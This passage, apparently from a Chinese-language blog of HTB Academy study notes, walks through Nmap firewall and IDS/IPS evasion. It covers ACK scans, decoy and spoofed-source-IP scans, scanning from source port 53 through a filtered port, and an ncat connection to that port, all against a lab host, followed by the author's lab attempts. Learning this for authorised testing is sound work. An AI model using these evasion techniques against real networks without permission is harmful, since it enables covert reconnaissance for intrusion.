[10.129.2.28 &gt; 10.10.14.2 Port 21 unreachable (type=3/code=3) ] IP [ttl=64 id=40884 iplen=72 ]RCVD (0.0341s) TCP 10.129.2.28:22 &gt; 10.10.14.2:57347 SA ttl=64 id=0 iplen=44  seq=1153454414 win=64240 &lt;mss 1460&gt;RCVD (1.0386s) TCP 10.129.2.28:22 &gt; 10.10.14.2:57347 SA ttl=64 id=0 iplen=44  seq=1153454414 win=64240 &lt;mss 1460&gt;SENT (1.1366s) TCP 10.10.14.2:57348 &gt; 10.129.2.28:25 S ttl=44 id=6796 iplen=44  seq=4092320759 win=1024 &lt;mss 1460&gt;Nmap scan report for 10.129.2.28Host is up (0.0053s latency).PORT   STATE    SERVICE21/tcp filtered ftp22/tcp open     ssh25/tcp filtered smtpMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds</code></pre><h4 id="ACK-Scan"><a href="#ACK-Scan" class="headerlink" title="ACK-Scan"></a>ACK-Scan</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-traceStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 14:57 CESTSENT (0.0422s) TCP 10.10.14.2:49343 &gt; 10.129.2.28:21 A ttl=49 id=12381 iplen=40  seq=0 win=1024SENT (0.0423s) TCP 10.10.14.2:49343 &gt; 10.129.2.28:22 A ttl=41 id=5146 iplen=40  seq=0 win=1024SENT (0.0423s) TCP 10.10.14.2:49343 &gt; 10.129.2.28:25 A ttl=49 id=5800 iplen=40  seq=0 win=1024RCVD (0.1252s) ICMP [10.129.2.28 &gt; 10.10.14.2 Port 21 unreachable (type=3/code=3) ] IP [ttl=64 id=55628 iplen=68 ]RCVD (0.1268s) TCP 10.129.2.28:22 &gt; 10.10.14.2:49343 R ttl=64 id=0 iplen=40  seq=1660784500 win=0SENT (1.3837s) TCP 10.10.14.2:49344 &gt; 10.129.2.28:25 A ttl=59 id=21915 iplen=40  seq=0 win=1024Nmap scan report for 10.129.2.28Host is up (0.083s latency).PORT   STATE      SERVICE21/tcp filtered   ftp22/tcp unfiltered ssh25/tcp filtered   smtpMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds</code></pre><table><thead><tr><th><strong>Scanning Options</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>-sS</code></td><td>Performs SYN scan on specified ports.</td></tr><tr><td><code>-sA</code></td><td>Performs ACK scan on specified ports.</td></tr><tr><td><code>-Pn</code></td><td>Disables ICMP Echo requests.</td></tr><tr><td><code>-n</code></td><td>Disables DNS resolution.</td></tr><tr><td><code>--disable-arp-ping</code></td><td>Disables ARP ping.</td></tr><tr><td><code>--packet-trace</code></td><td>Shows all packets sent and received.</td></tr></tbody></table><p>请注意我们从目标收到的RCVD数据包及其设置标志。使用SYN扫描（-sS），我们的目标试图通过发送回设置了SYN-ACK（SA）标志的数据包来建立TCP连接，使用ACK扫描（-SA），我们得到RST标志，因为TCP端口22是打开的。对于TCP端口25，我们没有收到任何返回的数据包，这表明数据包将被丢弃。</p><h2 id="Detect-IDS-x2F-IPS"><a href="#Detect-IDS-x2F-IPS" class="headerlink" title="Detect IDS&#x2F;IPS"></a>Detect IDS&#x2F;IPS</h2><p>与防火墙及其规则不同，IDS&#x2F;IPS系统的检测要困难得多，因为它们是被动的流量监控系统。IDS系统检查主机之间的所有连接。如果IDS发现包含定义的内容或规范的数据包，则会通知管理员，并在最坏的情况下采取适当的操作。 IPS系统采取管理员独立配置的措施，自动防止潜在的攻击。必须知道IDS和IPS是不同的应用程序，IPS是IDS的补充。 建议使用几个具有不同IP地址的虚拟专用服务器（VPS）来确定渗透测试期间这些系统是否在目标网络上。如果管理员检测到对目标网络的这种潜在攻击，第一步是阻止潜在攻击的IP地址。因此，我们将无法再使用该IP地址访问网络，我们的互联网服务提供商（ISP）将被联系并阻止访问所有互联网。 IDS系统通常单独用于帮助管理员检测网络上的潜在攻击。然后，他们可以决定如何处理此类连接。我们可以从管理员那里触发某些安全措施，例如，通过主动扫描单个端口及其服务。根据是否采取了特定的安全措施，我们可以检测网络是否有一些监控应用程序。 确定这样的IPS系统是否存在于目标网络中的一种方法是从单个主机（VPS）进行扫描。如果在任何时候此主机被阻止并且无法访问目标网络，我们知道管理员已经采取了一些安全措施。因此，我们可以继续使用另一个VPS进行渗透测试。 因此，我们知道我们需要更安静地进行扫描，在最好的情况下，掩盖与目标网络及其服务的所有交互。</p><h2 id="Decoys"><a href="#Decoys" class="headerlink" title="Decoys"></a>Decoys</h2><p>在某些情况下，管理员原则上会阻止来自不同区域的特定子网。这将阻止对目标网络的任何访问。另一个例子是什么时候IPS应该阻止我们。因此，Decoy扫描方法（-D）是正确的选择。通过这种方法，Nmap生成插入到IP报头中的各种随机IP地址，以伪装发送的数据包的来源。使用此方法，我们可以生成由冒号（：）分隔的特定数量（例如：5）的IP地址的随机（RND）。然后，我们的真实IP地址被随机放置在生成的IP地址之间。在下一个示例中，我们的真实IP地址因此被放置在第二个位置。另一个关键点是诱饵必须是活着的。否则，由于SYN洪泛安全机制，目标上的服务可能无法访问。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:14 CESTSENT (0.0378s) TCP 102.52.161.59:59289 &gt; 10.129.2.28:80 S ttl=42 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;SENT (0.0378s) TCP 10.10.14.2:59289 &gt; 10.129.2.28:80 S ttl=59 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;SENT (0.0379s) TCP 210.120.38.29:59289 &gt; 10.129.2.28:80 S ttl=37 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;SENT (0.0379s) TCP 191.6.64.171:59289 &gt; 10.129.2.28:80 S ttl=38 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;SENT (0.0379s) TCP 184.178.194.209:59289 &gt; 10.129.2.28:80 S ttl=39 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;SENT (0.0379s) TCP 43.21.121.33:59289 &gt; 10.129.2.28:80 S ttl=55 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;RCVD (0.1370s) TCP 10.129.2.28:80 &gt; 10.10.14.2:59289 SA ttl=64 id=0 iplen=44  seq=4056111701 win=64240 &lt;mss 1460&gt;Nmap scan report for 10.129.2.28Host is up (0.099s latency).PORT   STATE SERVICE80/tcp open  httpMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds</code></pre><table><thead><tr><th><code>-sS</code></th><th>Performs SYN scan on specified ports.</th></tr></thead><tbody><tr><td><code>-Pn</code></td><td>Disables ICMP Echo requests.</td></tr><tr><td><code>-n</code></td><td>Disables DNS resolution.</td></tr><tr><td><code>--disable-arp-ping</code></td><td>Disables ARP ping.</td></tr><tr><td><code>--packet-trace</code></td><td>Shows all packets sent and received.</td></tr><tr><td><code>-D RND:5</code></td><td>Generates five random IP addresses that indicates the source IP the connection comes from.</td></tr></tbody></table><p>伪造的数据包通常会被互联网服务提供商和路由器过滤掉，即使它们来自同一网络范围。因此，我们还可以指定我们的VPS服务器的IP地址，并将其与IP标头中的“IP ID”操作结合使用，以扫描目标。 另一种情况是，只有个别子网无法访问服务器的特定服务。因此，我们也可以手动指定源IP地址（-S），以测试我们是否使用此地址获得更好的结果。诱饵可用于SYN、ACK、ICMP扫描和操作系统检测扫描。因此，让我们看看这样一个例子，并确定它最有可能是哪种操作系统。</p><h4 id="Testing-Firewall-Rule"><a href="#Testing-Firewall-Rule" class="headerlink" title="Testing Firewall Rule"></a>Testing Firewall Rule</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p445 -OStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:23 CESTNmap scan report for 10.129.2.28Host is up (0.032s latency).PORT    STATE    SERVICE445/tcp filtered microsoft-dsMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Too many fingerprints match this host to give specific OS detailsNetwork Distance: 1 hopOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 3.14 seconds</code></pre><h4 id="Scan-by-Using-Different-Source-IP"><a href="#Scan-by-Using-Different-Source-IP" class="headerlink" title="Scan by Using Different Source IP"></a>Scan by Using Different Source IP</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:16 CESTNmap scan report for 10.129.2.28Host is up (0.010s latency).PORT    STATE SERVICE445/tcp open  microsoft-dsMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)No exact OS matches for host (test conditions non-ideal).Network Distance: 1 hopOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 4.11 seconds</code></pre><table><thead><tr><th><code>-n</code></th><th>Disables DNS resolution.</th></tr></thead><tbody><tr><td><code>-Pn</code></td><td>Disables ICMP Echo requests.</td></tr><tr><td><code>-p 445</code></td><td>Scans only the specified ports.</td></tr><tr><td><code>-O</code></td><td>Performs operation system detection scan.</td></tr><tr><td><code>-S</code></td><td>Scans the target by using different source IP address.</td></tr><tr><td><code>10.129.2.200</code></td><td>Specifies the source IP address.</td></tr><tr><td><code>-e tun0</code></td><td>Sends all requests through the specified interface.</td></tr></tbody></table><h2 id="DNS-Proxying"><a href="#DNS-Proxying" class="headerlink" title="DNS Proxying"></a>DNS Proxying</h2><p>默认情况下，除非另有规定，否则Nmap会执行反向DNS解析，以查找有关我们目标的更重要信息。这些DNS查询在大多数情况下也会被传递，因为给定的web服务器应该被找到并访问。DNS查询是通过UDP端口53进行的。TCP端口53以前仅用于DNS服务器之间的所谓“区域传输”或大于512字节的数据传输。由于IPv6和DNSSEC的扩展，这种情况正在发生越来越多的变化。这些更改导致许多DNS请求通过TCP端口53进行。 然而，Nmap仍然为我们自己指定DNS服务器提供了一种方法（–DNS server＜ns＞，＜ns＞）。如果我们在非军事区，这种方法对我们来说可能是至关重要的。该公司的DNS服务器通常比来自互联网的服务器更受信任。因此，例如，我们可以使用它们与内部网络的主机进行交互。作为另一个例子，我们可以使用TCP端口53作为扫描的源端口（–source端口）。如果管理员使用防火墙控制该端口，并且没有正确过滤IDS&#x2F;IPS，则我们的TCP数据包将受到信任并通过。</p><h4 id="SYN-Scan-of-a-Filtered-Port"><a href="#SYN-Scan-of-a-Filtered-Port" class="headerlink" title="SYN-Scan of a Filtered Port"></a>SYN-Scan of a Filtered Port</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-traceStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 22:50 CESTSENT (0.0417s) TCP 10.10.14.2:33436 &gt; 10.129.2.28:50000 S ttl=41 id=21939 iplen=44  seq=736533153 win=1024 &lt;mss 1460&gt;SENT (1.0481s) TCP 10.10.14.2:33437 &gt; 10.129.2.28:50000 S ttl=46 id=6446 iplen=44  seq=736598688 win=1024 &lt;mss 1460&gt;Nmap scan report for 10.129.2.28Host is up.PORT      STATE    SERVICE50000/tcp filtered ibm-db2Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds</code></pre><h4 id="SYN-Scan-From-DNS-Port"><a href="#SYN-Scan-From-DNS-Port" class="headerlink" title="SYN-Scan From DNS Port"></a>SYN-Scan From DNS Port</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53SENT (0.0482s) TCP 10.10.14.2:53 &gt; 10.129.2.28:50000 S ttl=58 id=27470 iplen=44  seq=4003923435 win=1024 &lt;mss 1460&gt;RCVD (0.0608s) TCP 10.129.2.28:50000 &gt; 10.10.14.2:53 SA ttl=64 id=0 iplen=44  seq=540635485 win=64240 &lt;mss 1460&gt;Nmap scan report for 10.129.2.28Host is up (0.013s latency).PORT      STATE SERVICE50000/tcp open  ibm-db2MAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds</code></pre><table><thead><tr><th><code>-sS</code></th><th>Performs SYN scan on specified ports.</th></tr></thead><tbody><tr><td><code>-Pn</code></td><td>Disables ICMP Echo requests.</td></tr><tr><td><code>-n</code></td><td>Disables DNS resolution.</td></tr><tr><td><code>--disable-arp-ping</code></td><td>Disables ARP ping.</td></tr><tr><td><code>--packet-trace</code></td><td>Shows all packets sent and received.</td></tr><tr><td><code>--source-port 53</code></td><td>Performs the scans from specified source port.</td></tr></tbody></table><p>现在我们已经发现防火墙接受TCP端口53，很可能IDS&#x2F;IPS过滤器的配置也比其他过滤器弱得多。我们可以通过尝试使用Netcat连接到此端口来测试这一点。</p><h4 id="Connect-To-The-Filtered-Port"><a href="#Connect-To-The-Filtered-Port" class="headerlink" title="Connect To The Filtered Port"></a>Connect To The Filtered Port</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ncat -nv --source-port 53 10.129.2.28 50000Ncat: Version 7.80 ( https://nmap.org/ncat )Ncat: Connected to 10.129.2.28:50000.220 ProFTPd</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="Firewall-and-IDS-x2F-IPS-Evasion-Easy-Lab"><a href="#Firewall-and-IDS-x2F-IPS-Evasion-Easy-Lab" class="headerlink" title="Firewall and IDS&#x2F;IPS Evasion - Easy Lab"></a>Firewall and IDS&#x2F;IPS Evasion - Easy Lab</h1><p>我们的客户想知道我们是否可以识别他们提供的机器运行在哪个操作系统上。提交操作系统名称作为答案。</p><p>hint：记住，你不需要提供它的版本。想想哪些服务可以为你提供有关操作系统的信息。在采访了管理员后，我们发现他们想阻止其&#x2F;24子网掩码的相邻主机相互通信。</p><p>这里明显是要使用RND制造间距，但是扫描到的结果比较迷，也没找到正确答案，两次相同的代码扫到不同的结果，也是有点人麻了……</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307082037111.png" alt="image-20230708203746705"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307082037754.png" alt="image-20230708203708394"></p><h1 id="Firewall-and-IDS-x2F-IPS-Evasion-Medium-Lab"><a href="#Firewall-and-IDS-x2F-IPS-Evasion-Medium-Lab" class="headerlink" title="Firewall and IDS&#x2F;IPS Evasion - Medium Lab"></a>Firewall and IDS&#x2F;IPS Evasion - Medium Lab</h1><p>配置传输到系统后，我们的客户想知道是否有可能找到我们目标的DNS服务器版本。提交目标的DNS服务器版本作为答案。</p><p>hint：在会议期间，管理员们谈到了我们测试的主机是一个以前没有提到的可公开访问的服务器。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307091003338.png" alt="image-20230709100334372"></p><p>–script dns-nsid：此选项指定要在扫描期间运行的特定Nmap脚本。dns-nsid脚本设计用于执行dns名称服务器标识符（nsid）查询并从dns服务器收集信息。</p><p>最高难度的就算了，人蒙了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Nmap提供了许多不同类型的扫描，可用于获得有关我们目标的各种结果。基本上，Nmap可以分为以下扫描技术： 主机发现 端口扫描 服务枚举和检测 OS检测 与目标服务的脚本化交互（Nmap脚本引擎）&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
</feed>
